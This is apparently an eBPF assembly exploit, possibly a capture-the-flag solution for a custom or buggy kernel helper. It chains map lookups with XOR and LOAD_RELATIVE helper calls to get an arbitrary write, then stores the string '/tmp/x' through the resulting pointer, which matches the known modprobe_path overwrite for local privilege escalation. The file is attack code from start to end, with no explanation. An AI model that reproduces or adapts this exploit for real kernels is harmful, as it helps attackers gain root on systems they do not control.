#define XOR 212
#define MAP_LOOKUP_ELEM 1
#define SKC_TO_UNIX 178
#define DYNPTR_FROM_MEM 197
#define THIS_CPU 154
#define STRTOL 105
#define LOAD_RELATIVE 68

#define RDONLY_MAP 3

#define fp r10

.macro mptr reg, fd
    ld_pseudo \reg, 1, \fd
.endm

_start:
    r9 = r1
    mptr r1, 3
    r2 = fp
    r2 += -8
    *(u64 *)(r2 + 0) = 0
    call MAP_LOOKUP_ELEM
    if r0 == 0 goto done1
    r7 = r0

    mptr r1, 4
    r2 = fp
    r2 += -8
    *(u64 *)(r2 + 0) = 0
    call MAP_LOOKUP_ELEM
    if r0 == 0 goto done1
    r8 = r0

    r1 = *(u64 *)(r7 + 0)

    r3 = r7
    r2 = 8
    r1 = fp
    r1 += -16
    *(u64 *)(r1 + 0) = 8 ^ 2025
    call XOR

    r5 = 1
    r4 = *(u64 *)(r7 + 0)
    r4 += 8
    r3 = fp
    r3 += -16
    *(u64 *)(r3 + 8) = r8
    r2 = 0
    r1 = r9
    call LOAD_RELATIVE

    r8 = *(u64 *)(fp - 8)
    r1 = 0x782f706d742f ll
    *(u64 *)(r8 + 0) = r1
    r0 = 13
    exit

done1:
    r0 = 1
    exit